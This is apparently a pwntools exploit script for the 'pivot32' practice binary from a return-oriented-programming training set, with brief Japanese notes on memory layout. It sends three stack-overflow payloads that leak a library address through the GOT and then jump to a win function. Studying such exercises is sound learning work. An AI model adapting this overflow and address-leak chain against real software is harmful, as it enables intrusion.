"""
main
ebp-0xc <= malloc( 0x1000000 )
ebp-0x10 <= [ebp-0xc] + 0xffff00 = 0x1FFFF00(確保したメモリのケツから100Byte分)

pwnme( ebp-0x10 := buffer )
ebp-0x28 := buffer2[0x20]
fgets( buffer, 0x100, stdin )
fgets( buffer2, 0x3a, stdin )

"""

from pwn import *
#context.log_level = 'debug'
elf = ELF("./pivot32")
lib = ELF("./libpivot32.so")
p = process("./pivot32")
# = remote("localhost", 7777 )

# ----- first payload ----- #
payload = b''
payload += b'A'* 0x28
payload += b'BBBB'
payload += p32( elf.plt["foothold_function"] )
payload += p32( elf.symbols["main"] )

p.recvuntil("> ")
p.sendline( "AAAA" )
p.recvuntil("> ")
p.sendline( payload )

# ----- second payload ----- #
payload = b''
payload += b'A' * 0x28
payload += b'BBBB'
payload += p32( elf.plt["puts"] )
payload += p32( elf.symbols["main"] )
payload += p32( elf.got["foothold_function"] )

p.recvuntil("> ")
p.sendline( "AAAA" )
p.recvuntil("> ")
p.sendline( payload )
lib_pivot = u32( p.recvline()[:4] ) - lib.symbols["foothold_function"]
info( "LIB_PIVOT :%#x",lib_pivot )

# ----- third payload ----- #
payload = b''
payload += b'A' * 0x28
payload += b'BBBB'
payload += p32( lib_pivot + lib.symbols["ret2win"] )

p.recvuntil('> ')
p.sendline("AAAA")
p.recvuntil('> ')
p.sendline( payload )
print( p.recv() )
